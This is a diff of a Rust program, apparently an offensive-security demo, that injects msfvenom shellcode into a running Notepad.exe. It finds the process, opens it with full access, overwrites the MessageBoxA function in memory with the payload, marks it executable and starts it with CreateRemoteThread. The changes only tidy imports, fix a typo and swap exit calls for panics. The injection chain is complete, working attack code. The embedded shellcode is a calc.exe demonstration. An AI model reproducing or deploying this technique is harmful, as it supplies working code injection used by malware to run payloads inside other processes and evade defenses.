@@ -1,41 +1,44 @@
-use std::ffi::c_void;
-use std::ptr::{null, null_mut};
-use std::{mem::transmute, process::exit};
-use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows::core::s;
-use windows::Win32::Foundation::HANDLE;
-use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows::Win32::System::Memory::{
-    VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+use std::{
+    ffi::c_void,
+    mem::transmute,
+    ptr::{null, null_mut},
 };
-use windows::Win32::System::Threading::{
-    CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
+use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use windows::{
+    core::s,
+    Win32::Foundation::HANDLE,
+    Win32::System::{
+        Diagnostics::Debug::WriteProcessMemory,
+        LibraryLoader::{GetProcAddress, LoadLibraryA},
+        Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
+        Threading::{
+            CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
+        },
+    },
 };
 
-fn find_procees(name: &str) -> Result<HANDLE, String> {
+fn find_process(name: &str) -> Result<HANDLE, String> {
     let mut system = System::new_all();
     system.refresh_all();
 
     for (pid, process) in system.processes() {
         if process.name() == name {
             let pid = pid.as_u32();
-            let hprocess = unsafe {
-                OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap_or_else(|e| {
-                    eprintln!("[!] OpenProcess Failed With Error: {e}");
-                    exit(-1);
-                })
-            };
-
-            return Ok(hprocess);
+            let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
+            if hprocess.is_err() {
+                return Err(String::from(format!(
+                    "Failed to open process with PID: {pid}"
+                )));
+            } else {
+                return Ok(hprocess.unwrap());
+            }
         }
     }
 
-    return Err(String::from("[!] Erro"));
+    return Err(String::from("Process not found"));
 }
 
 fn main() {
-
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -59,19 +62,16 @@ fn main() {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
     unsafe {
-        let hprocess = find_procees("Notepad.exe").unwrap_or_else(|e| {
-            eprintln!("[!] find_procees Failed With Error: {e}");
-            exit(-1);
+        let hprocess = find_process("Notepad.exe").unwrap_or_else(|e| {
+            panic!("[!] find_process Failed With Error: {e}");
         });
 
         let hmodule = LoadLibraryA(s!("user32")).unwrap_or_else(|e| {
-            eprintln!("[!] LoadLibraryA Failed With Error: {e}");
-            exit(-1);
+            panic!("[!] LoadLibraryA Failed With Error: {e}");
         });
 
         let func = GetProcAddress(hmodule, s!("MessageBoxA")).unwrap_or_else(|| {
-            eprintln!("[!] GetProcAddress Failed Error");
-            exit(-1);
+            panic!("[!] GetProcAddress Failed");
         });
 
         let func_ptr = transmute::<_, *mut c_void>(func);
@@ -83,10 +83,8 @@ fn main() {
             shellcode.len(),
             PAGE_READWRITE,
             &mut oldprotect,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtectEx (1) Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] VirtualProtectEx (1) Failed With Error: {e}");
         });
 
         WriteProcessMemory(
@@ -95,10 +93,8 @@ fn main() {
             shellcode.as_ptr() as _,
             shellcode.len(),
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] WriteProcessMemory Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] WriteProcessMemory Failed With Error: {e}");
         });
 
         VirtualProtectEx(
@@ -107,10 +103,8 @@ fn main() {
             shellcode.len(),
             PAGE_EXECUTE_READWRITE,
             &mut oldprotect,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtectEx (2) Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] VirtualProtectEx (2) Failed With Error: {e}");
         });
 
         let hthread = CreateRemoteThread(
@@ -121,10 +115,8 @@ fn main() {
             Some(null()),
             0,
             Some(null_mut()),
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateRemoteThread Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateRemoteThread Failed With Error: {e}");
         });
 
         WaitForSingleObject(hthread, INFINITE);
